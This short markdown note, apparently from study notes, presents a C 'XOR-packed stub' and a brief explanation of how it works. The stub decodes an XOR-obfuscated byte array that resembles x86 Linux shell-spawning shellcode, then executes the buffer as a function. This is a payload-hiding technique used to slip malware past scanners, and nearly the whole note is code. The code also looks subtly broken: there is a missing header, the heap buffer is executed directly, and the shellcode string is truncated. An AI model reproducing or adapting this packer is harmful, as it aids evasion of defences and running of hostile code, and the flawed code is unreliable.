
---


**XOR-packed stub in C**

```
#include <stdio.h>
#include <stdint.h>
#include <string.h>

// XOR key
#define KEY 0xAA

// Encrypted payload (XOR'd version of the original shellcode/message)
uint8_t encrypted_payload[] = {
    0xEB ^ KEY, 0x1E ^ KEY, 0x5E ^ KEY, 0x31 ^ KEY, 0xC0 ^ KEY,
    0x88 ^ KEY, 0x46 ^ KEY, 0x0A ^ KEY, 0x88 ^ KEY, 0x46 ^ KEY,
    0x0B ^ KEY, 0xB0 ^ KEY, 0x0B ^ KEY, 0x89 ^ KEY, 0xF3 ^ KEY,
    0x8D ^ KEY, 0x4E ^ KEY, 0x0A ^ KEY, 0x8D ^ KEY, 0x56 ^ KEY,
    0x0B ^ KEY, 0xCD ^ KEY, 0x80 ^ KEY, 0xE8 ^ KEY, 0xDD ^ KEY,
    0xFF ^ KEY, 0xFF ^ KEY, 0xFF ^ KEY, 's' ^ KEY, 'h' ^ KEY,
    0x00 ^ KEY
};

// Decrypt and execute
int main() {
    size_t len = sizeof(encrypted_payload);
    uint8_t *payload = malloc(len);
    if (!payload) return 1;

    // Decrypt
    for (size_t i = 0; i < len; i++) {
        payload[i] = encrypted_payload[i] ^ KEY;
    }

    // Cast to function and execute
    void (*func)() = (void (*)())payload;
    func();

    free(payload);
    return 0;
}
```

---
#### How it works?

>[!important]
>
> - The payload is XOR-encrypted with a key (`0xAA`).
 >- At runtime, the stub decrypts it in memory.
> - It then casts the decrypted buffer to a function pointer and executes it.

